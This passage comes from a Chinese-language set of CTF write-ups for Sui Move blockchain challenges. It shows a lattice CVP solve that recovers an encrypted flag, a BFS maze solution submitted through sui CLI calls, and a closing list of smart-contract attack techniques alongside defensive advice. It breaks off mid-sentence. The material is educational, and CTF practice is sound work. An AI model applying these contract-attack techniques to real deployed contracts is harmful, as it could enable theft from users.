63</li><li><strong>分类</strong>: blockchain, hohctf, sui, move</li><li><strong>解题人数</strong>: 32</li><li><strong>题目描述</strong>: 我在链上用随机数隐藏了我的私钥，但是我忘记我私钥的内容了，你能帮我恢复私钥嘛？</li></ul><h2 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h2><ul><li><strong>Package ID</strong>: <code>0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9</code></li><li><strong>部署交易哈希</strong>: <code>Go2jkNk5tR1EnCNV2Fw2zaP6zQfQRPfUeEFyyi6rtJiR</code></li></ul><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1. 题目分析"></a>1. 题目分析</h3><p>这是一道结合了密码学和区块链技术的综合性CTF题目。通过分析提供的Move智能合约源码，可以发现：</p><ol><li>题目使用线性代数加密方案隐藏flag</li><li>加密公式：<code>enc = A * flag + k</code><ul><li><code>A</code>: 64x23的固定矩阵</li><li><code>flag</code>: 23字节的明文（即我们要恢复的私钥）</li><li><code>k</code>: 64维随机向量</li><li><code>enc</code>: 64维密文向量</li></ul></li></ol><h3 id="2-关键代码分析"><a href="#2-关键代码分析" class="headerlink" title="2. 关键代码分析"></a>2. 关键代码分析</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 加密函数</span>entry fun <span class="token function">entrypt_flag</span><span class="token punctuation">(</span>plain_flag<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span><span class="token punctuation">,</span> r<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Random</span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token function">get_a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 获取64x23矩阵</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> k<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u64</span><span class="token operator">></span> <span class="token operator">=</span> vector<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 生成64个随机数作为噪声</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        k<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token namespace">random<span class="token punctuation">::</span></span><span class="token function">generate_u64_in_range</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> generator<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4294967296</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 执行加密: enc = A * flag + k</span>    <span class="token keyword">let</span> enc <span class="token operator">=</span> <span class="token function">matadd</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token function">matmul</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ex_plain_flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 验证函数</span>public entry fun <span class="token function">decrypt_flag</span><span class="token punctuation">(</span>flag<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">blake2b256</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> x<span class="token string">"5c9d8d1c17561e80b1e29b4a7809b369eb94e3d8b6808c19c69e25f94f67817a"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">FlagEvent</span> <span class="token punctuation">&#123;</span>        owner<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span><span class="token function">sender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        flag<span class="token punctuation">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-密码学原理"><a href="#3-密码学原理" class="headerlink" title="3. 密码学原理"></a>3. 密码学原理</h3><p>这是一个基于格理论的加密方案，类似于Learning With Errors (LWE) 问题。要解密需要解决最近向量问题（CVP - Closest Vector Problem）。</p><h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="步骤1-环境准备"><a href="#步骤1-环境准备" class="headerlink" title="步骤1: 环境准备"></a>步骤1: 环境准备</h3><p>首先安装SageMath数学计算软件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> sagemath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="步骤2-分析密文"><a href="#步骤2-分析密文" class="headerlink" title="步骤2: 分析密文"></a>步骤2: 分析密文</h3><p>从合约源码中可以看到加密后的密文：</p><pre class="line-numbers language-none"><code class="language-none">[13244763658160674624, 16984722715248776010, 13823152552092075312, ...]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="步骤3-使用CVP算法解密"><a href="#步骤3-使用CVP算法解密" class="headerlink" title="步骤3: 使用CVP算法解密"></a>步骤3: 使用CVP算法解密</h3><p>题目提供了解密脚本 <code>decrypt.sage</code>，核心算法是Babai CVP算法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">Babai_CVP</span><span class="token punctuation">(</span>Lattice<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    M <span class="token operator">=</span> Lattice<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    G <span class="token operator">=</span> M<span class="token punctuation">.</span>gram_schmidt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    diff <span class="token operator">=</span> target    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>M<span class="token punctuation">.</span>nrows<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        diff <span class="token operator">-=</span>  M<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>diff <span class="token operator">*</span> G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">round</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> target <span class="token operator">-</span> diff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="步骤4-运行解密脚本"><a href="#步骤4-运行解密脚本" class="headerlink" title="步骤4: 运行解密脚本"></a>步骤4: 运行解密脚本</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> solve/testssage decrypt.sage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出结果：</p><pre class="line-numbers language-none"><code class="language-none">[-]the flag length is: 23(102, 108, 97, 103, 123, 53, 85, 105, 95, 77, 48, 86, 101, 95, 67, 79, 78, 116, 114, 65, 67, 55, 125)[+]flag&#123;5Ui_M0Ve_CONtrAC7&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="步骤5-验证flag"><a href="#步骤5-验证flag" class="headerlink" title="步骤5: 验证flag"></a>步骤5: 验证flag</h3><p>使用Sui CLI调用链上合约验证flag：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token punctuation">\</span>  <span class="token parameter variable">--package</span> 0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9 <span class="token punctuation">\</span>  <span class="token parameter variable">--module</span> crypto <span class="token punctuation">\</span>  <span class="token parameter variable">--function</span> decrypt_flag <span class="token punctuation">\</span>  <span class="token parameter variable">--args</span> <span class="token string">"flag&#123;5Ui_M0Ve_CONtrAC7&#125;"</span> <span class="token punctuation">\</span>  --gas-budget <span class="token number">10000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解题结果-1"><a href="#解题结果-1" class="headerlink" title="解题结果"></a>解题结果</h2><ul><li><strong>Flag</strong>: <code>flag&#123;5Ui_M0Ve_CONtrAC7&#125;</code></li><li><strong>交易哈希</strong>: <code>2FPqgAyMe2e7qB5xigrwi35oTqrmwmuC45pCudHLdtVX</code></li><li><strong>验证状态</strong>: Success，成功触发FlagEvent</li></ul><h2 id="技术要点"><a href="#技术要点" class="headerlink" title="技术要点"></a>技术要点</h2><h3 id="1-格理论基础"><a href="#1-格理论基础" class="headerlink" title="1. 格理论基础"></a>1. 格理论基础</h3><ul><li><strong>格 (Lattice)</strong>: 由基向量张成的离散点集</li><li><strong>CVP问题</strong>: 给定格和目标向量，找到格中最接近目标的向量</li><li><strong>LLL算法</strong>: 格基约化算法，用于找到较短的基向量</li></ul><h3 id="2-Babai算法"><a href="#2-Babai算法" class="headerlink" title="2. Babai算法"></a>2. Babai算法</h3><p>Babai算法是解决CVP问题的近似算法：</p><ol><li>对格基进行LLL约化</li><li>使用Gram-Schmidt正交化</li><li>通过舍入操作找到最近向量</li></ol><h3 id="3-Move智能合约"><a href="#3-Move智能合约" class="headerlink" title="3. Move智能合约"></a>3. Move智能合约</h3><ul><li>使用Sui区块链的Move语言</li><li>集成随机数生成器进行加密</li><li>通过事件机制验证解题结果</li></ul><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这道题目巧妙地结合了：</p><ul><li><strong>密码学</strong>: 基于格理论的加密方案</li><li><strong>数学</strong>: 线性代数和最近向量问题</li><li><strong>区块链</strong>: Sui Move智能合约技术</li></ul><p>解题的关键在于理解LWE类型的加密方案，并使用适当的格理论算法（CVP）来恢复明文。</p><hr><h1 id="4-迷宫游戏"><a href="#4-迷宫游戏" class="headerlink" title="4. 迷宫游戏"></a>4. 迷宫游戏</h1><h2 id="题目信息-2"><a href="#题目信息-2" class="headerlink" title="题目信息"></a>题目信息</h2><ul><li><strong>题目名称</strong>: 迷宫游戏</li><li><strong>题目描述</strong>: 这是一道ctf题目 这里有一个迷宫游戏，你能顺利走出这个迷宫吗</li><li><strong>Package ID</strong>: <code>0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20</code></li><li><strong>部署交易哈希</strong>: <code>AgCw1ZGx5GFHFJHFTgdqjaVqY2zLrMbSgtevJz29K6yz</code></li><li><strong>区块链</strong>: Sui Network</li><li><strong>语言</strong>: Move</li></ul><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="1-合约结构分析"><a href="#1-合约结构分析" class="headerlink" title="1. 合约结构分析"></a>1. 合约结构分析</h3><p>通过查看Move合约源码，发现这是一个基于Sui区块链的迷宫游戏：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">const</span> <span class="token constant">ROW</span><span class="token punctuation">:</span> <span class="token keyword">u64</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">COL</span><span class="token punctuation">:</span> <span class="token keyword">u64</span> <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">MAZE</span><span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token string">b"#S########\n#**#######\n##*#######\n##***#####\n####*#####\n##***###E#\n##*#####*#\n##*#####*#\n##*******#\n##########"</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">START_POS</span><span class="token punctuation">:</span> <span class="token keyword">u64</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-迷宫布局"><a href="#2-迷宫布局" class="headerlink" title="2. 迷宫布局"></a>2. 迷宫布局</h3><p>迷宫是一个10行11列的网格：</p><pre class="line-numbers language-none"><code class="language-none">#S#########**#########*#########***#########*#######***###E###*#####*###*#####*###*******###########<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>#</code>: 墙壁</li><li><code>S</code>: 起点 (位置1)</li><li><code>E</code>: 终点 (位置63)</li><li><code>*</code>: 可通行路径</li></ul><h3 id="3-游戏机制"><a href="#3-游戏机制" class="headerlink" title="3. 游戏机制"></a>3. 游戏机制</h3><p>合约提供三个主要函数：</p><ol><li><strong>create_challenge()</strong>: 创建挑战，生成ChallengeStatus对象</li><li><strong>complete_challenge()</strong>: 完成迷宫，需要提供正确的移动序列</li><li><strong>claim_flag()</strong>: 获取flag，需要挑战完成后调用</li></ol><p>移动控制：</p><ul><li><code>w</code> (ASCII 119): 向上移动</li><li><code>s</code> (ASCII 115): 向下移动</li><li><code>a</code> (ASCII 97): 向左移动</li><li><code>d</code> (ASCII 100): 向右移动</li></ul><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="步骤1-迷宫路径分析"><a href="#步骤1-迷宫路径分析" class="headerlink" title="步骤1: 迷宫路径分析"></a>步骤1: 迷宫路径分析</h3><p>使用BFS算法分析迷宫，找到从起点S到终点E的最短路径。</p><p>位置编号系统：</p><ul><li>位置 &#x3D; 行 × 11 + 列</li><li>起点S在位置1 (第0行第1列)</li><li>终点E在位置63 (第5行第8列)</li></ul><h3 id="步骤2-路径搜索算法"><a href="#步骤2-路径搜索算法" class="headerlink" title="步骤2: 路径搜索算法"></a>步骤2: 路径搜索算法</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">from</span> collections <span class="token keyword">import</span> deque    start_pos <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># S的位置</span>    end_pos <span class="token operator">=</span> <span class="token number">63</span>   <span class="token comment"># E的位置</span>    queue <span class="token operator">=</span> deque<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>start_pos<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    visited <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span>start_pos<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> queue<span class="token punctuation">:</span>        current_pos<span class="token punctuation">,</span> path <span class="token operator">=</span> queue<span class="token punctuation">.</span>popleft<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> current_pos <span class="token operator">==</span> end_pos<span class="token punctuation">:</span>            <span class="token keyword">return</span> path        <span class="token comment"># 尝试四个方向的移动</span>        moves <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># 上</span>            <span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">,</span>   <span class="token comment"># 下</span>            <span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>   <span class="token comment"># 左</span>            <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment"># 右</span>        <span class="token punctuation">]</span>        <span class="token keyword">for</span> move_char<span class="token punctuation">,</span> delta <span class="token keyword">in</span> moves<span class="token punctuation">:</span>            new_pos <span class="token operator">=</span> current_pos <span class="token operator">+</span> delta            <span class="token comment"># 边界检查和墙壁检查</span>            <span class="token comment"># ...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="步骤3-找到解决方案"><a href="#步骤3-找到解决方案" class="headerlink" title="步骤3: 找到解决方案"></a>步骤3: 找到解决方案</h3><p>通过BFS搜索，找到最短路径：<strong><code>sdssddssaasssddddddwww</code></strong></p><p>路径验证：</p><ol><li>S(1) → s → 12(<em>) → d → 13(</em>) → s → 24(<em>) → s → 35(</em>)</li><li>35(<em>) → d → 36(</em>) → d → 37(<em>) → s → 48(</em>) → s → 59(*)</li><li>59(<em>) → a → 58(</em>) → a → 57(<em>) → s → 68(</em>) → s → 79(*)</li><li>79(<em>) → s → 90(</em>) → d → 91(<em>) → d → 92(</em>) → d → 93(*)</li><li>93(<em>) → d → 94(</em>) → d → 95(<em>) → d → 96(</em>) → w → 85(*)</li><li>85(<em>) → w → 74(</em>) → w → 63(E) ✅</li></ol><h2 id="链上执行"><a href="#链上执行" class="headerlink" title="链上执行"></a>链上执行</h2><h3 id="步骤1-创建挑战"><a href="#步骤1-创建挑战" class="headerlink" title="步骤1: 创建挑战"></a>步骤1: 创建挑战</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token punctuation">\</span>  <span class="token parameter variable">--package</span> 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 <span class="token punctuation">\</span>  <span class="token parameter variable">--module</span> maze <span class="token punctuation">\</span>  <span class="token parameter variable">--function</span> create_challenge <span class="token punctuation">\</span>  --gas-budget <span class="token number">10000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结果</strong>:</p><ul><li>Transaction Digest: <code>BUYeRta41EpQuNTFC41Rj1HYP3m1kfXSGffqgiNGCE5Z</code></li><li>Challenge Object ID: <code>0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55</code></li></ul><h3 id="步骤2-完成迷宫挑战"><a href="#步骤2-完成迷宫挑战" class="headerlink" title="步骤2: 完成迷宫挑战"></a>步骤2: 完成迷宫挑战</h3><p>将路径字符串转换为字节数组：</p><ul><li><code>sdssddssaasssddddddwww</code> → <code>[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]</code></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token punctuation">\</span>  <span class="token parameter variable">--package</span> 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 <span class="token punctuation">\</span>  <span class="token parameter variable">--module</span> maze <span class="token punctuation">\</span>  <span class="token parameter variable">--function</span> complete_challenge <span class="token punctuation">\</span>  <span class="token parameter variable">--args</span> 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 <span class="token string">'[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]'</span> <span class="token punctuation">\</span>  --gas-budget <span class="token number">10000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结果</strong>:</p><ul><li>Transaction Digest: <code>FfbrP2KJemjqbmHJLpCQtthNTnEz7Fs1H6Emop4amqtx</code></li><li>触发Success事件，路径验证成功</li></ul><h3 id="步骤3-获取Flag"><a href="#步骤3-获取Flag" class="headerlink" title="步骤3: 获取Flag"></a>步骤3: 获取Flag</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token punctuation">\</span>  <span class="token parameter variable">--package</span> 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 <span class="token punctuation">\</span>  <span class="token parameter variable">--module</span> maze <span class="token punctuation">\</span>  <span class="token parameter variable">--function</span> claim_flag <span class="token punctuation">\</span>  <span class="token parameter variable">--args</span> 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 <span class="token punctuation">\</span>  --gas-budget <span class="token number">10000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结果</strong>:</p><ul><li><strong>Transaction Digest</strong>: <code>6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ</code></li><li>触发FlagEvent事件，success: true</li></ul><h2 id="关键技术点-1"><a href="#关键技术点-1" class="headerlink" title="关键技术点"></a>关键技术点</h2><h3 id="1-Move合约分析"><a href="#1-Move合约分析" class="headerlink" title="1. Move合约分析"></a>1. Move合约分析</h3><ul><li>理解Sui Move语法和结构</li><li>分析entry函数的参数要求</li><li>理解事件机制</li></ul><h3 id="2-算法应用"><a href="#2-算法应用" class="headerlink" title="2. 算法应用"></a>2. 算法应用</h3><ul><li>BFS最短路径搜索</li><li>二维网格坐标转换</li><li>边界条件处理</li></ul><h3 id="3-区块链交互"><a href="#3-区块链交互" class="headerlink" title="3. 区块链交互"></a>3. 区块链交互</h3><ul><li>Sui CLI工具使用</li><li>交易参数格式化</li><li>对象ID管理</li></ul><h3 id="4-数据转换"><a href="#4-数据转换" class="headerlink" title="4. 数据转换"></a>4. 数据转换</h3><ul><li>字符串到字节数组转换</li><li>ASCII码映射</li><li>Move类型系统理解</li></ul><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>这道题目考查了：</p><ol><li><strong>Move智能合约分析能力</strong></li><li><strong>图论算法应用</strong> (BFS路径搜索)</li><li><strong>区块链工具使用</strong> (Sui CLI)</li><li><strong>数据格式转换</strong> (字符串→字节数组)</li></ol><p><strong>最终答案</strong>: <code>6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ</code></p><p><strong>Flag</strong>: <code>CTF&#123;Letsmovectf&#125;</code></p><h2 id="工具和脚本"><a href="#工具和脚本" class="headerlink" title="工具和脚本"></a>工具和脚本</h2><p>解题过程中使用的Python脚本可以帮助：</p><ul><li>迷宫可视化和路径搜索</li><li>字节数组格式转换</li><li>自动化区块链交互</li></ul><hr><h1 id="综合技术总结"><a href="#综合技术总结" class="headerlink" title="综合技术总结"></a>综合技术总结</h1><h2 id="核心技能矩阵"><a href="#核心技能矩阵" class="headerlink" title="核心技能矩阵"></a>核心技能矩阵</h2><h3 id="1-Move智能合约分析"><a href="#1-Move智能合约分析" class="headerlink" title="1. Move智能合约分析"></a>1. Move智能合约分析</h3><ul><li><strong>语法理解</strong>: 掌握Sui Move的基本语法和类型系统</li><li><strong>漏洞识别</strong>: 能够发现注释代码、计费错误等常见漏洞</li><li><strong>对象模型</strong>: 理解Sui的对象所有权和转移机制</li><li><strong>事件系统</strong>: 掌握事件的触发和监听机制</li></ul><h3 id="2-算法与数据结构"><a href="#2-算法与数据结构" class="headerlink" title="2. 算法与数据结构"></a>2. 算法与数据结构</h3><ul><li><strong>动态规划</strong>: 房屋强盗问题的经典DP解法及其变种</li><li><strong>图论算法</strong>: BFS在路径搜索中的应用</li><li><strong>格理论</strong>: CVP问题和LLL算法的实际应用</li><li><strong>时间复杂度</strong>: 算法效率分析和优化</li></ul><h3 id="3-密码学知识"><a href="#3-密码学知识" class="headerlink" title="3. 密码学知识"></a>3. 密码学知识</h3><ul><li><strong>LWE问题</strong>: Learning With Errors加密方案的原理</li><li><strong>格基约化</strong>: LLL算法和Babai算法的实现</li><li><strong>最近向量问题</strong>: CVP的数学背景和解决方法</li><li><strong>哈希函数</strong>: Blake2b等密码学哈希的应用</li></ul><h3 id="4-区块链技术"><a href="#4-区块链技术" class="headerlink" title="4. 区块链技术"></a>4. 区块链技术</h3><ul><li><strong>Sui CLI</strong>: 命令行工具的熟练使用</li><li><strong>PTB机制</strong>: Programmable Transaction Block的构造和执行</li><li><strong>时间戳攻击</strong>: 利用区块链时间戳特性的攻击方法</li><li><strong>Gas优化</strong>: 交易费用的估算和优化</li></ul><h2 id="攻击技术分类"><a href="#攻击技术分类" class="headerlink" title="攻击技术分类"></a>攻击技术分类</h2><h3 id="1-智能合约漏洞利用"><a href="#1-智能合约漏洞利用" class="headerlink" title="1. 智能合约漏洞利用"></a>1. 智能合约漏洞利用</h3><ul><li><strong>代码审计</strong>: 发现被注释的关键代码</li><li><strong>逻辑错误</strong>: 利用计费不一致等业务逻辑漏洞</li><li><strong>状态管理</strong>: 利用状态更新的时序问题</li><li><strong>权限控制</strong>: 绕过访问控制机制</li></ul><h3 id="2-时间相关攻击"><a href="#2-时间相关攻击" class="headerlink" title="2. 时间相关攻击"></a>2. 时间相关攻击</h3><ul><li><strong>时间戳依赖</strong>: 利用可预测的时间戳生成随机数</li><li><strong>PTB同步</strong>: 确保批量操作使用相同时间戳</li><li><strong>时序攻击</strong>: 利用操作执行的时间差</li></ul><h3 id="3-数学攻击"><a href="#3-数学攻击" class="headerlink" title="3. 数学攻击"></a>3. 数学攻击</h3><ul><li><strong>算法逆向</strong>: 通过分析算法找到逆向求解方法</li><li><strong>概率分析</strong>: 计算攻击成功的概率并优化策略</li><li><strong>密码学攻击</strong>: 使用高级数学工具破解加密方案</li></ul><h3 id="4-自动化攻击"><a href="#4-自动化攻击" class="headerlink" title="4. 自动化攻击"></a>4. 自动化攻击</h3><ul><li><strong>脚本编写</strong>: 开发自动化攻击脚本</li><li><strong>批量操作</strong>: 通过PTB执行大量重复操作</li><li><strong>条件触发</strong>: 等待有利条件自动执行攻击</li></ul><h2 id="防御策略建议"><a href="#防御策略建议" class="headerlink" title="防御策略建议"></a>防御策略建议</h2><h3 id="1-代码安全"><a href="#1-代码安全" class="headerlink" title="1. 代码安全"></a>1. 代码安全</h3><ul><li><strong>完整性检查</strong>: 确保所有必要的代码都被执行</li><li><strong>逻辑一致性</strong>: 检查和扣费逻辑必须保持一致</li><li><strong>边界验证</strong>: 严格验证所有输入参数的边界条件</li><li><strong>状态同步</strong>: 确保状态更新的原子性</li></ul><h3 id="2-随机数安全"><a href="#2-随机数安全" class="headerlink" title="2. 随机数安全"></a>2. 随机数安全</h3><ul><li><strong>真随机源</strong>: 使用密码学安全的随机数生成器</li><li><strong>时间戳避免</strong>: 不要依赖可预测的时间戳</li><li><strong>熵源多样化</strong>: 结合多个熵源生成随机数</li><li><strong>随机性测试</strong>: 定期测试随机数的质量</li></ul><h3 id="3-访问控制"><a href="#3-访问控制" class="headerlink" title="3. 访问控制"></a>3. 访问控制</h3><ul><li><strong>权限最小化</strong>: 只授予必要的最小权限</li><li><strong>多重验证</strong>: 关键操作需要多重验证</li><li><strong>时间锁</strong>: 对重要操作添加时间延迟</li><li><strong>频率限制</strong>: 限制高频操作的执行</li></ul><h3 id="4-监控和审计"><a href="#4-监控和审计" class="headerlink" title="4. 监控和审计"></a>4. 监控和审计</h3><ul><li><strong>事件监控</strong>: 实时监控异常事件和模式</li><li><strong>交易分析</strong>: 分析可疑的交易模式</li><li><strong>代码审计</strong>: 定期进行专业的代码安全审计</li><li><strong>渗透测试</strong>: 定期进行安全渗透测试</li></ul><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>这四道Sui Move CTF题目展示了区块链安全的多个重要方面：</p><ol><li><strong>技术深度</strong>: 从基础的路径搜索到高级的格理论密码学</li><li><strong>攻击复杂性</strong>: 从单一漏洞利用到多漏洞组合攻击</li><li><strong>工具多样性</strong>: 从简单的CLI工具到复杂的数学软件</li><li><strong>思维方式</strong>: 